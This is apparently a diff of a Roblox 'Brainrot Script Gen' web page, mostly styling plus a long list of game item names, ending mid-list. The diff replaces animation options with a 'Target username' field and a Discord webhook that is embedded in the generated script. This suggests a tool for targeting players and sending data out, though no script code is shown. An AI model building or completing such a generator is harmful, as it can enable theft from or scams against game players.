@@ -9,17 +9,17 @@
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
   :root {
-    --bg: #0a0b0f;
-    --surface: #111318;
-    --panel: #161a22;
-    --border: #1e2430;
+    --bg: #080a0e;
+    --surface: #0f1117;
+    --panel: #13161f;
+    --border: #1c2130;
     --accent: #00e5ff;
-    --accent2: #7c3aed;
-    --accent-glow: rgba(0,229,255,0.15);
-    --text: #e2e8f0;
-    --muted: #64748b;
+    --purple: #a78bfa;
+    --discord: #5865f2;
+    --green: #10b981;
     --danger: #f43f5e;
-    --success: #10b981;
+    --text: #dde4f0;
+    --muted: #4a5568;
   }
 
   body {
@@ -30,35 +30,34 @@
     overflow-x: hidden;
   }
 
-  /* Grid background */
   body::before {
     content: '';
     position: fixed;
     inset: 0;
     background-image:
-      linear-gradient(rgba(0,229,255,0.03) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(0,229,255,0.03) 1px, transparent 1px);
-    background-size: 40px 40px;
+      linear-gradient(rgba(0,229,255,0.025) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,229,255,0.025) 1px, transparent 1px);
+    background-size: 44px 44px;
     pointer-events: none;
     z-index: 0;
   }
 
-  .container {
+  .wrap {
     position: relative;
     z-index: 1;
-    max-width: 1100px;
+    max-width: 920px;
     margin: 0 auto;
-    padding: 2rem 1.5rem 4rem;
+    padding: 2.8rem 1.5rem 6rem;
   }
 
-  /* Header */
+  /* ── Header ── */
   header {
     text-align: center;
     margin-bottom: 3rem;
-    animation: fadeDown 0.6s ease both;
+    animation: fadeDown .55s ease both;
   }
 
-  .logo-line {
+  .logo-row {
     display: flex;
     align-items: center;
     justify-content: center;
@@ -66,574 +65,437 @@
     margin-bottom: 0.5rem;
   }
 
-  .logo-line::before, .logo-line::after {
+  .logo-row::before,
+  .logo-row::after {
     content: '';
     flex: 1;
     height: 1px;
-    background: linear-gradient(to right, transparent, var(--accent));
-    max-width: 200px;
+    max-width: 160px;
   }
 
-  .logo-line::after {
-    background: linear-gradient(to left, transparent, var(--accent));
-  }
+  .logo-row::before { background: linear-gradient(to right, transparent, var(--accent)); }
+  .logo-row::after  { background: linear-gradient(to left,  transparent, var(--accent)); }
 
   h1 {
-    font-size: clamp(2rem, 5vw, 3.2rem);
+    font-size: clamp(1.9rem, 4.5vw, 3rem);
     font-weight: 700;
-    letter-spacing: 0.08em;
+    letter-spacing: .1em;
     text-transform: uppercase;
-    background: linear-gradient(135deg, var(--accent) 0%, #a78bfa 100%);
+    background: linear-gradient(130deg, var(--accent) 0%, var(--purple) 100%);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
     background-clip: text;
     line-height: 1;
   }
 
-  .subtitle {
-    color: var(--muted);
-    font-size: 1rem;
-    letter-spacing: 0.15em;
-    text-transform: uppercase;
+  .tagline {
     font-family: 'Share Tech Mono', monospace;
+    font-size: .78rem;
+    letter-spacing: .18em;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-top: .4rem;
   }
 
-  /* Main grid */
-  .grid {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    grid-template-rows: auto auto;
-    gap: 1.5rem;
-  }
-
-  @media (max-width: 720px) {
-    .grid { grid-template-columns: 1fr; }
-    .output-panel { grid-column: 1; }
-  }
-
-  /* Panels */
+  /* ── Panel base ── */
   .panel {
     background: var(--panel);
     border: 1px solid var(--border);
     border-radius: 12px;
     overflow: hidden;
-    animation: fadeUp 0.5s ease both;
+    margin-bottom: 1.2rem;
+    animation: fadeUp .5s ease both;
   }
 
-  .panel:nth-child(1) { animation-delay: 0.1s; }
-  .panel:nth-child(2) { animation-delay: 0.2s; }
-  .panel:nth-child(3) { animation-delay: 0.3s; grid-column: 1 / -1; }
+  .panel:nth-child(1) { animation-delay: .05s; }
+  .panel:nth-child(2) { animation-delay: .13s; }
+  .panel:nth-child(3) { animation-delay: .21s; }
+  .panel:nth-child(4) { animation-delay: .29s; }
 
-  .panel-header {
+  .ph {
     display: flex;
     align-items: center;
-    gap: 0.6rem;
-    padding: 0.9rem 1.2rem;
+    gap: .6rem;
+    padding: .75rem 1.25rem;
     background: var(--surface);
     border-bottom: 1px solid var(--border);
   }
 
-  .panel-dot {
-    width: 8px; height: 8px;
+  .dot {
+    width: 7px; height: 7px;
     border-radius: 50%;
-    background: var(--accent);
-    box-shadow: 0 0 8px var(--accent);
-    animation: pulse 2s infinite;
+    flex-shrink: 0;
+    animation: blink 2.2s infinite;
   }
 
-  .panel-title {
-    font-size: 0.8rem;
-    text-transform: uppercase;
-    letter-spacing: 0.15em;
-    color: var(--muted);
+  .dot-cyan   { background: var(--accent);   box-shadow: 0 0 7px var(--accent); }
+  .dot-purple { background: var(--purple);   box-shadow: 0 0 7px var(--purple); animation-delay:.4s; }
+  .dot-discord{ background: var(--discord);  box-shadow: 0 0 7px var(--discord); animation-delay:.8s; }
+  .dot-green  { background: var(--green);    box-shadow: 0 0 7px var(--green);  animation-delay:1.2s; }
+
+  .ph-title {
     font-family: 'Share Tech Mono', monospace;
+    font-size: .72rem;
+    text-transform: uppercase;
+    letter-spacing: .15em;
+    color: var(--muted);
   }
 
-  .panel-body { padding: 1.2rem; }
+  .pb { padding: 1.25rem; }
 
-  /* Animal selector */
-  .search-wrap {
-    position: relative;
-    margin-bottom: 0.8rem;
+  .lbl {
+    display: block;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .68rem;
+    text-transform: uppercase;
+    letter-spacing: .13em;
+    color: var(--muted);
+    margin-bottom: .45rem;
   }
 
-  .search-wrap input {
-    width: 100%;
+  /* ── BOX 1 — brainrot selector ── */
+  .search-row {
+    display: flex;
+    gap: .6rem;
+    margin-bottom: .75rem;
+  }
+
+  .search-input {
+    flex: 1;
     background: var(--bg);
     border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 0.6rem 0.8rem 0.6rem 2.2rem;
+    border-radius: 7px;
+    padding: .55rem .85rem;
     color: var(--text);
     font-family: 'Share Tech Mono', monospace;
-    font-size: 0.85rem;
+    font-size: .82rem;
     outline: none;
-    transition: border-color 0.2s;
+    transition: border-color .2s;
   }
 
-  .search-wrap input:focus { border-color: var(--accent); }
+  .search-input:focus { border-color: var(--accent); }
+  .search-input::placeholder { color: #272f3f; }
 
-  .search-icon {
-    position: absolute;
-    left: 0.7rem;
-    top: 50%;
-    transform: translateY(-50%);
-    color: var(--muted);
-    font-size: 0.85rem;
+  .btn-sm {
+    padding: .5rem .9rem;
+    background: rgba(0,229,255,.06);
+    border: 1px solid rgba(0,229,255,.2);
+    border-radius: 7px;
+    color: var(--accent);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .68rem;
+    text-transform: uppercase;
+    letter-spacing: .08em;
+    cursor: pointer;
+    white-space: nowrap;
+    transition: background .2s;
   }
 
-  .select-list {
+  .btn-sm:hover { background: rgba(0,229,255,.14); }
+
+  .btn-sm.red {
+    color: var(--danger);
+    border-color: rgba(244,63,94,.25);
+    background: rgba(244,63,94,.05);
+  }
+
+  .btn-sm.red:hover { background: rgba(244,63,94,.12); }
+
+  /* scrollable list */
+  .animal-list {
     background: var(--bg);
     border: 1px solid var(--border);
     border-radius: 8px;
-    height: 260px;
+    height: 240px;
     overflow-y: auto;
     scrollbar-width: thin;
     scrollbar-color: var(--border) transparent;
   }
 
-  .select-list::-webkit-scrollbar { width: 4px; }
-  .select-list::-webkit-scrollbar-track { background: transparent; }
-  .select-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+  .animal-list::-webkit-scrollbar { width: 4px; }
+  .animal-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
 
-  .animal-item {
+  .a-item {
     display: flex;
     align-items: center;
-    gap: 0.7rem;
-    padding: 0.55rem 0.9rem;
+    gap: .65rem;
+    padding: .48rem .9rem;
     cursor: pointer;
-    transition: background 0.15s;
-    border-bottom: 1px solid rgba(255,255,255,0.03);
-    font-size: 0.9rem;
+    border-bottom: 1px solid rgba(255,255,255,.025);
+    transition: background .12s;
+    user-select: none;
   }
 
-  .animal-item:last-child { border-bottom: none; }
-  .animal-item:hover { background: rgba(0,229,255,0.05); }
-  .animal-item.selected { background: rgba(0,229,255,0.1); }
+  .a-item:last-child { border-bottom: none; }
+  .a-item:hover { background: rgba(0,229,255,.05); }
+  .a-item.on    { background: rgba(0,229,255,.09); }
 
-  .animal-item input[type="checkbox"] {
+  .a-item input[type=checkbox] {
     accent-color: var(--accent);
-    width: 14px; height: 14px;
+    width: 13px; height: 13px;
     cursor: pointer;
     flex-shrink: 0;
   }
 
-  .animal-name { flex: 1; line-height: 1.2; }
+  .a-name { font-size: .88rem; line-height: 1.2; flex: 1; }
 
-  .select-count {
-    margin-top: 0.6rem;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.75rem;
-    color: var(--muted);
+  .meta-row {
     display: flex;
     justify-content: space-between;
+    align-items: center;
+    margin-top: .6rem;
   }
 
-  .btn-clear {
-    background: none;
-    border: none;
-    color: var(--danger);
+  .sel-count {
     font-family: 'Share Tech Mono', monospace;
-    font-size: 0.75rem;
-    cursor: pointer;
-    padding: 0;
-    transition: opacity 0.2s;
-  }
-  .btn-clear:hover { opacity: 0.7; }
-
-  /* Speed input */
-  .field-label {
-    font-size: 0.75rem;
-    text-transform: uppercase;
-    letter-spacing: 0.12em;
+    font-size: .7rem;
     color: var(--muted);
-    font-family: 'Share Tech Mono', monospace;
-    margin-bottom: 0.5rem;
-    display: block;
   }
 
-  .speed-input {
+  .sel-count span { color: var(--accent); }
+
+  /* ── Text inputs ── */
+  .txt {
     width: 100%;
     background: var(--bg);
     border: 1px solid var(--border);
     border-radius: 8px;
-    padding: 0.65rem 0.9rem;
+    padding: .72rem 1rem;
     color: var(--text);
     font-family: 'Share Tech Mono', monospace;
-    font-size: 1rem;
+    font-size: .88rem;
     outline: none;
-    transition: border-color 0.2s;
-    margin-bottom: 1rem;
+    transition: border-color .2s, box-shadow .2s;
   }
 
-  .speed-input:focus { border-color: var(--accent); }
-  .speed-input[type=number]::-webkit-inner-spin-button { opacity: 0.4; }
-
-  /* Mode toggle */
-  .toggle-group {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 0.5rem;
-    margin-bottom: 1rem;
-  }
-
-  .toggle-btn {
-    padding: 0.6rem;
-    background: var(--bg);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    color: var(--muted);
-    font-family: 'Rajdhani', sans-serif;
-    font-size: 0.9rem;
-    font-weight: 600;
-    letter-spacing: 0.05em;
-    cursor: pointer;
-    transition: all 0.2s;
-    text-align: center;
-  }
-
-  .toggle-btn.active {
-    background: rgba(0,229,255,0.1);
+  .txt:focus {
     border-color: var(--accent);
-    color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(0,229,255,.07);
   }
 
-  /* Generate button */
-  .btn-generate {
+  .txt::placeholder { color: #1e2636; }
+  .hint { font-family: 'Share Tech Mono', monospace; font-size: .67rem; color: #252f40; margin-top: .4rem; }
+
+  /* ── Generate ── */
+  .btn-gen {
+    display: block;
     width: 100%;
-    padding: 0.85rem;
-    background: linear-gradient(135deg, var(--accent) 0%, #38bdf8 100%);
+    padding: .92rem;
+    background: linear-gradient(130deg, var(--accent) 0%, #38bdf8 100%);
     border: none;
-    border-radius: 8px;
-    color: #0a0b0f;
+    border-radius: 10px;
+    color: #040608;
     font-family: 'Rajdhani', sans-serif;
-    font-size: 1.05rem;
+    font-size: 1.1rem;
     font-weight: 700;
-    letter-spacing: 0.12em;
+    letter-spacing: .14em;
     text-transform: uppercase;
     cursor: pointer;
-    transition: all 0.2s;
-    box-shadow: 0 0 20px rgba(0,229,255,0.2);
+    transition: all .2s;
+    box-shadow: 0 0 26px rgba(0,229,255,.16);
+    margin-bottom: 1.2rem;
   }
 
-  .btn-generate:hover {
-    box-shadow: 0 0 30px rgba(0,229,255,0.4);
-    transform: translateY(-1px);
-  }
+  .btn-gen:hover { box-shadow: 0 0 40px rgba(0,229,255,.35); transform: translateY(-1px); }
+  .btn-gen:active { transform: none; }
 
-  .btn-generate:active { transform: translateY(0); }
-
-  /* Output */
-  .output-panel { grid-column: 1 / -1; }
-
-  .output-header-actions {
-    display: flex;
-    align-items: center;
-    gap: 0.8rem;
-    margin-left: auto;
-  }
+  /* ── Output ── */
+  .out-ph { display: flex; align-items: center; gap: .6rem; padding: .75rem 1.25rem; background: var(--surface); border-bottom: 1px solid var(--border); }
 
   .btn-copy {
-    display: flex;
-    align-items: center;
-    gap: 0.4rem;
-    padding: 0.3rem 0.8rem;
-    background: rgba(0,229,255,0.1);
-    border: 1px solid rgba(0,229,255,0.3);
+    margin-left: auto;
+    padding: .26rem .7rem;
+    background: rgba(0,229,255,.07);
+    border: 1px solid rgba(0,229,255,.22);
     border-radius: 6px;
     color: var(--accent);
     font-family: 'Share Tech Mono', monospace;
-    font-size: 0.75rem;
-    cursor: pointer;
-    transition: all 0.2s;
+    font-size: .68rem;
     text-transform: uppercase;
-    letter-spacing: 0.1em;
+    letter-spacing: .1em;
+    cursor: pointer;
+    transition: all .2s;
   }
 
-  .btn-copy:hover { background: rgba(0,229,255,0.2); }
-  .btn-copy.copied { color: var(--success); border-color: var(--success); background: rgba(16,185,129,0.1); }
+  .btn-copy:hover { background: rgba(0,229,255,.16); }
+  .btn-copy.ok { color: var(--green); border-color: var(--green); background: rgba(16,185,129,.07); }
 
-  .output-code {
+  .code-block {
     background: var(--bg);
     border: 1px solid var(--border);
     border-radius: 8px;
     padding: 1rem 1.2rem;
     font-family: 'Share Tech Mono', monospace;
-    font-size: 0.82rem;
-    line-height: 1.7;
-    color: #94d4e7;
-    min-height: 160px;
-    max-height: 380px;
+    font-size: .79rem;
+    line-height: 1.8;
+    color: #7ecfe8;
+    min-height: 120px;
+    max-height: 480px;
     overflow-y: auto;
-    white-space: pre-wrap;
-    word-break: break-all;
+    white-space: pre;
+    overflow-x: auto;
     scrollbar-width: thin;
     scrollbar-color: var(--border) transparent;
   }
 
-  .output-code .kw { color: #c792ea; }
-  .output-code .fn { color: #82aaff; }
-  .output-code .str { color: #c3e88d; }
-  .output-code .num { color: #f78c6c; }
-  .output-code .comment { color: #546e7a; }
-  .output-code.empty { color: var(--muted); font-style: italic; }
+  .code-block.empty { color: #1e2a38; font-style: italic; white-space: pre-wrap; }
 
-  /* Animations */
-  @keyframes fadeDown {
-    from { opacity: 0; transform: translateY(-20px); }
-    to   { opacity: 1; transform: translateY(0); }
-  }
-  @keyframes fadeUp {
-    from { opacity: 0; transform: translateY(20px); }
-    to   { opacity: 1; transform: translateY(0); }
-  }
-  @keyframes pulse {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.4; }
-  }
+  /* syntax colours */
+  .ck  { color: #546e7a; }
+  .kw  { color: #c792ea; }
+  .fn  { color: #82aaff; }
+  .str { color: #c3e88d; }
+  .var { color: #f07178; }
 
-  /* Separator */
-  .divider {
-    grid-column: 1 / -1;
-    height: 1px;
-    background: linear-gradient(to right, transparent, var(--border), transparent);
-    margin: 0;
-  }
+  /* ── Animations ── */
+  @keyframes fadeDown { from { opacity:0; transform: translateY(-16px); } to { opacity:1; transform: none; } }
+  @keyframes fadeUp   { from { opacity:0; transform: translateY(16px);  } to { opacity:1; transform: none; } }
+  @keyframes blink    { 0%,100% { opacity:1; } 50% { opacity:.3; } }
 </style>
 </head>
 <body>
-<div class="container">
+<div class="wrap">
 
   <header>
-    <div class="logo-line">
-      <h1>Brainrot Script Gen</h1>
-    </div>
-    <p class="subtitle">Roblox Animation Script Generator</p>
+    <div class="logo-row"><h1>Brainrot Script Gen</h1></div>
+    <p class="tagline">Roblox • Brainrot Animals • Script Generator</p>
   </header>
 
-  <div class="grid">
-
-    <!-- Box 1: Animal Selector -->
-    <div class="panel">
-      <div class="panel-header">
-        <div class="panel-dot"></div>
-        <span class="panel-title">Select Animals</span>
+  <!-- BOX 1 – Animal selector -->
+  <div class="panel">
+    <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Select Brainrot Animals</span></div>
+    <div class="pb">
+      <div class="search-row">
+        <input class="search-input" id="searchBox" type="text" placeholder="Search animals..." oninput="filterList()">
+        <button class="btn-sm" onclick="selectAll()">All</button>
+        <button class="btn-sm red" onclick="clearAll()">Clear</button>
       </div>
-      <div class="panel-body">
-        <div class="search-wrap">
-          <span class="search-icon">⌕</span>
-          <input type="text" id="searchInput" placeholder="Search animals..." oninput="filterAnimals()">
-        </div>
-        <div class="select-list" id="animalList"></div>
-        <div class="select-count">
-          <span id="selectedCount">0 selected</span>
-          <button class="btn-clear" onclick="clearSelection()">Clear All</button>
-        </div>
+      <div class="animal-list" id="animalList"></div>
+      <div class="meta-row">
+        <span class="sel-count"><span id="selNum">0</span> selected</span>
       </div>
     </div>
-
-    <!-- Box 2: Options -->
-    <div class="panel">
-      <div class="panel-header">
-        <div class="panel-dot" style="background:#a78bfa;box-shadow:0 0 8px #a78bfa;"></div>
-        <span class="panel-title">Script Options</span>
-      </div>
-      <div class="panel-body">
-
-        <label class="field-label">Animation Speed</label>
-        <input class="speed-input" type="number" id="speedInput" value="1" step="0.1" min="0.01" max="100" placeholder="1">
-
-        <label class="field-label">Script Mode</label>
-        <div class="toggle-group">
-          <button class="toggle-btn active" id="modeLoop" onclick="setMode('loop')">🔁 Loop</button>
-          <button class="toggle-btn" id="modeSingle" onclick="setMode('single')">▶ Single Play</button>
-        </div>
-
-        <label class="field-label">Output Format</label>
-        <div class="toggle-group">
-          <button class="toggle-btn active" id="fmtLocal" onclick="setFormat('localscript')">LocalScript</button>
-          <button class="toggle-btn" id="fmtScript" onclick="setFormat('script')">Script</button>
-        </div>
-
-        <br>
-        <button class="btn-generate" onclick="generateScript()">⚡ Generate Script</button>
-
-      </div>
-    </div>
-
-    <!-- Box 3: Output -->
-    <div class="panel output-panel">
-      <div class="panel-header">
-        <div class="panel-dot" style="background:#10b981;box-shadow:0 0 8px #10b981;animation-delay:0.5s;"></div>
-        <span class="panel-title">Generated Script</span>
-        <div class="output-header-actions">
-          <button class="btn-copy" id="copyBtn" onclick="copyScript()">⧉ Copy</button>
-        </div>
-      </div>
-      <div class="panel-body">
-        <div class="output-code empty" id="outputCode">-- Your generated script will appear here...</div>
-      </div>
-    </div>
-
   </div>
-</div>
 
+  <!-- BOX 2 – Username -->
+  <div class="panel">
+    <div class="ph"><div class="dot dot-purple"></div><span class="ph-title">Roblox Username</span></div>
+    <div class="pb">
+      <label class="lbl">Target username</label>
+      <input class="txt" id="usernameInput" type="text" placeholder="e.g. Builderman" autocomplete="off" spellcheck="false">
+      <p class="hint">The Roblox username to target in the script.</p>
+    </div>
+  </div>
+
+  <!-- BOX 3 – Webhook -->
+  <div class="panel">
+    <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Discord Webhook</span></div>
+    <div class="pb">
+      <label class="lbl">Webhook URL</label>
+      <input class="txt" id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false">
+      <p class="hint">Paste your Discord webhook — it gets placed directly into the script.</p>
+    </div>
+  </div>
+
+  <!-- Generate -->
+  <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>
+
+  <!-- Output -->
+  <div class="panel">
+    <div class="out-ph">
+      <div class="dot dot-green"></div>
+      <span class="ph-title">Generated Script</span>
+      <button class="btn-copy" id="copyBtn" onclick="copyOut()">⧉ Copy</button>
+    </div>
+    <div class="pb">
+      <div class="code-block empty" id="outputBlock">-- Fill in the fields above and hit Generate Script...</div>
+    </div>
+  </div>
+
+</div>
 <script>
-const ANIMALS = [
-  "1x1x1x1","25","67","Admin Lucky Block","Agarrini la Palini","Alessio","Anpali Babel","Antonio","Aquanaut","Arcadopus","Astrolero Cervalero","Avocadini Antilopini","Avocadini Guffo","Avocadorilla","Bacuru and Egguru","Ballerina Cappuccina","Ballerina Peppermintina","Ballerino Lololo","Bambini Crostini","Bambu Bambu Sahur","Bananita Dolphinita","Bananito Bandito","Bandito Axolito","Bandito Bobritto","Belula Beluga","Berenjello Angello","Bisonte Giuppitere","Blackhole Goat","Blueberrinni Octopusini","Boatito Auratito","Boba Panda","Bombardini Tortinii","Bombardiro Crocodilo","Bombombini Gusini","Boneca Ambalabu","Brainrot God Lucky Block","Brasilini Berimbini","Brr Brr Patapim","Brr es Teh Patipum","Brri Brri Bicus Dicus Bombicus","Brunito Marsito","Brutto Gialutto","Buho de Fuego","Buho de Noelo","Buho del Cielo","Bulbito Bandito Traktorito","Bunito Bunito Spinito","Bunnyman","Burbaloni Loliloli","Burguro And Fryuro","Burrito Bandito","Cacasito Satalito","Cachorrito Melonito","Cacto Hipopotamo","Capi Taco","Capitano Moby","Cappuccino Assassino","Cappuccino Clownino","Caramello Filtrello","Carloo","Carrotini Brainini","Cavallo Virtuoso","Celestial Pegasus","Celularcini Viciosini","Centrucci Nuclucci","Cerberus","Chachechi","Chef Crabracadabra","Chicleteira Bicicleteira","Chicleteira Cupideira","Chicleteira Noelteira","Chicleteirina Bicicleteirina","Chihuanini Taconini","Chill Puppy","Chillin Chili","Chimnino","Chimpanzini Bananini","Chipso and Queso","Chocco Bunny","Chrismasmamat","Cigno Fulgoro","Clickerino Crabo","Cocoa Assassino","Cocofanto Elefanto","Cocosini Mama","Coffin Tung Tung Tung Sahur","Cooki and Milki","Corn Corn Corn Sahur","Crabbo Limonetta","Cuadramat and Pakrahmatmamat","Cupcake Koala","Cupid Cupid Sahur","Cupid Hotspot","DJ Panda","Divino Platypio","Doi Doi Do","Dolphini Jetskini","Donkeyturbo Express","Dragon Cannelloni","Dragon Gingerini","Dug dug dug","Dul Dul Dul","Dumborino Miracello","Elefanto Frigo","Esok Sekolah","Espresso Signora","Eviledon","Extinct Ballerina","Extinct Matteo","Extinct Tralalero","Festive 67","Festive Lucky Block","Fishboard","Fishino Clownino","Fizzy Soda","Fluriflura","Fragola La La La","Fragrama and Chocrama","Frankentteo","Frigo Camelo","Frio Ninja","Frogato Pirato","Frogo Elfo","GOAT","Ganganzelli Trulala","Gangster Footera","Garama and Madundung","Gato Celesto","Gattatino Nyanino","Gattito Tacoto","Giftini Spyderini","Ginger Cisterna","Ginger Gerat","Ginger Globo","Girafa Celestre","Glorbo Fruttodrillo","Gobblino Uniciclino","Gold Elf","Gorillo Subwoofero","Gorillo Watermelondrillo","Graipuss Medussi","Granchiello Spiritell","Griffin","Guerriro Digitale","Guest 666","Harpuccino","Headless Horseman","Heart Lucky Block","Ho Ho Ho Sahur","Holy Arepa","Horegini Boom","Hydra Dragon Cannelloni","Jacko Jack Jack","Jacko Spaventosa","Jackorilla","Jingle Jingle Sahur","Job Job Job Sahur","Jolly Jolly Sahur","Karker Sahur","Karkerheart Luvkur","Karkerkar Kurkur","Ketchuru and Musturu","Ketupat Bros","Ketupat Kepat","Krupuk Pagi Pagi","La Casa Boo","La Cucaracha","La Extinct Grande","La Food Combinasion","La Ginger Sekolah","La Grande Combinasion","La Jolly Grande","La Karkerkar Combinasion","La Romantic Grande","La Sahur Combinasion","La Secret Combinasion","La Spooky Grande","La Supreme Combinasion","La Taco Combinasion","La Vacca Jacko Linterino","La Vacca Prese Presente","La Vacca Saturno Saturnita","Las Capuchinas","Las Sis","Las Tralaleritas","Las Vaquitas Saturnitas","Lavadorito Spinito","Lerulerulerule","Lionel Cactuseli","Lirilì Larilà","List List List Sahur","Los 25","Los 67","Los Amigos","Los Bombinitos","Los Bros","Los Burritos","Los Candies","Los Chicleteiras","Los Chihuaninis","Los Combinasionas","Los Crocodillitos","Los Cucarachas","Los Cupids","Los Gattitos","Los Hotspotsitos","Los Jobcitos","Los Jolly Combinasionas","Los Karkeritos","Los Lucky Blocks","Los Matteos","Los Mi Gatitos","Los Mobilis","Los Noobinis","Los Nooo My Hotspotsitos","Los Orcalitos","Los Planitos","Los Primos","Los Puggies","Los Quesadillas","Los Sekolahs","Los Spaghettis","Los Spooky Combinasionas","Los Spyderinis","Los Sweethearts","Los Taco Blocks","Los Tacoritas","Los Tipi Tacos","Los Tortus","Los Tralaleritos","Los Trios","Los Tungtungtungcitos","Love Love Bear","Love Love Love Sahur","Lovin Rose","Luv Luv Luv","Magi Ribbitini","Malame Amarele","Mangolini Parrocini","Mariachi Corazoni","Mastodontico Telepiedone","Matteo","Meowl","Mi Gatito","Mieteteira Bicicleteira","Money Money Man","Money Money Puggy","Money Money Reindeer","Mummio Rappitto","Mummy Ambalabu","Mythic Lucky Block","Nacho Spyder","Naughty Naughty","Noo La Polizia","Noo my Candy","Noo my Heart","Noo my Present","Noo my examine","Noobini Pizzanini","Noobini Santanini","Nooo My Hotspot","Nuclearo Dinossauro","Odin Din Din Dun","Orangutini Ananassini","Orcaledon","Orcalero Orcala","Orcalita Orcala","Pakrahmatmamat","Pakrahmatmatina","Pandaccini Bananini","Pandanini Frostini","Paradiso Axolottino","Pengolino Nuvoletto","Penguin Tree","Penguino Cocosino","Perochello Lemonchello","Perrito Burrito","Pi Pi Watermelon","Piccione Macchina","Piccionetta Macchina","Pinealotto Fruttarino","Pipi Avocado","Pipi Corni","Pipi Kiwi","Pipi Potato","Pirulitoita Bicicleteira","Please my Present","Pop Pop Sahur","Popcuru and Fizzuru","Pot Hotspot","Pot Pumpkin","Premium Festive Lucky Block","Premium Heart Lucky Block","Puffaball","Pumpkini Spyderini","Quackula","Quesadilla Crocodila","Quesadillo Vampiro","Quivioli Ameleonni","Raccooni Jandelini","Rang Ring Bus","Reindeer Tralala","Reinito Sleighito","Rhino Helicopterino","Rhino Toasterino","Rocco Disco","Rosetti Tualetti","Rosey and Teddy","Salamino Penguino","Sammyni Fattini","Sammyni Spyderini","Santa Hotspot","Santteo","Sealo Regalo","Secret Lucky Block","Serafinna Medusella","Seraphino Gruyero","Sigma Boy","Sigma Girl","Signore Carapace","Skibidi Toilet","Skull Skull Skull","Snailenzo","Spaghetti Tualetti","Spinny Hammy","Spioniro Golubiro","Spongini Quackini","Spooky Lucky Block","Spooky and Pumpky","Squalanana","Stoppo Luminino","Strawberrelli Flamingelli","Strawberry Elephant","Svinina Bombardino","Swag Soda","Swaggy Bros","Ta Ta Ta Ta Sahur","Taco Lucky Block","Tacorillo Crocodillo","Tacorita Bicicleta","Talpa Di Fero","Tang Tang Keletang","Tartaragno","Tartaruga Cisterna","Te Te Te Sahur","Telemorte","Tentacolo Tecnico","Ti Ti Ti Sahur","Tictac Sahur","Tigrilini Watermelini","Tigroligre Frutonni","Tim Cheese","Tipi Topi Taco","Tirilikalika Tirilikalako","To to to Sahur","Tob Tobi Tobi","Toiletto Focaccino","Tootini Shrimpini","Torrtuginni Dragonfrutini","Tracoducotulu Delapeladustuz","Tractoro Dinosauro","Tralaledon","Tralalero Tralala","Tralalita Tralala","Tree Tree Tree Sahur","Trenostruzzo Turbo 3000","Trenostruzzo Turbo 4000","Tric Trac Baraboom","Trickolino","Triplito Tralaleritos","Trippi Troppi","Trippi Troppi Troppa Trippa","Trulimero Trulicina","Tuff Toucan","Tukanno Bananno","Tung Tung Tung Sahur","Unclito Samito","Urubini Flamenguini","Vampira Cappucina","Ventoliero Pavonero","Vulturino Skeletono","W or L","Wombo Rollo","Yess my examine","Yeti Claus","Zibra Zubra Zibralini","Zombie Tralala"
-];
+const ANIMALS = ["1x1x1x1","25","67","Admin Lucky Block","Agarrini la Palini","Alessio","Anpali Babel","Antonio","Aquanaut","Arcadopus","Astrolero Cervalero","Avocadini Antilopini","Avocadini Guffo","Avocadorilla","Bacuru and Egguru","Ballerina Cappuccina","Ballerina Peppermintina","Ballerino Lololo","Bambini Crostini","Bambu Bambu Sahur","Bananita Dolphinita","Bananito Bandito","Bandito Axolito","Bandito Bobritto","Belula Beluga","Berenjello Angello","Bisonte Giuppitere","Blackhole Goat","Blueberrinni Octopusini","Boatito Auratito","Boba Panda","Bombardini Tortinii","Bombardiro Crocodilo","Bombombini Gusini","Boneca Ambalabu","Brainrot God Lucky Block","Brasilini Berimbini","Brr Brr Patapim","Brr es Teh Patipum","Brri Brri Bicus Dicus Bombicus","Brunito Marsito","Brutto Gialutto","Buho de Fuego","Buho de Noelo","Buho del Cielo","Bulbito Bandito Traktorito","Bunito Bunito Spinito","Bunnyman","Burbaloni Loliloli","Burguro And Fryuro","Burrito Bandito","Cacasito Satalito","Cachorrito Melonito","Cacto Hipopotamo","Capi Taco","Capitano Moby","Cappuccino Assassino","Cappuccino Clownino","Caramello Filtrello","Carloo","Carrotini Brainini","Cavallo Virtuoso","Celestial Pegasus","Celularcini Viciosini","Centrucci Nuclucci","Cerberus","Chachechi","Chef Crabracadabra","Chicleteira Bicicleteira","Chicleteira Cupideira","Chicleteira Noelteira","Chicleteirina Bicicleteirina","Chihuanini Taconini","Chill Puppy","Chillin Chili","Chimnino","Chimpanzini Bananini","Chipso and Queso","Chocco Bunny","Chrismasmamat","Cigno Fulgoro","Clickerino Crabo","Cocoa Assassino","Cocofanto Elefanto","Cocosini Mama","Coffin Tung Tung Tung Sahur","Cooki and Milki","Corn Corn Corn Sahur","Crabbo Limonetta","Cuadramat and Pakrahmatmamat","Cupcake Koala","Cupid Cupid Sahur","Cupid Hotspot","DJ Panda","Divino Platypio","Doi Doi Do","Dolphini Jetskini","Donkeyturbo Express","Dragon Cannelloni","Dragon Gingerini","Dug dug dug","Dul Dul Dul","Dumborino Miracello","Elefanto Frigo","Esok Sekolah","Espresso Signora","Eviledon","Extinct Ballerina","Extinct Matteo","Extinct Tralalero","Festive 67","Festive Lucky Block","Fishboard","Fishino Clownino","Fizzy Soda","Fluriflura","Fragola La La La","Fragrama and Chocrama","Frankentteo","Frigo Camelo","Frio Ninja","Frogato Pirato","Frogo Elfo","GOAT","Ganganzelli Trulala","Gangster Footera","Garama and Madundung","Gato 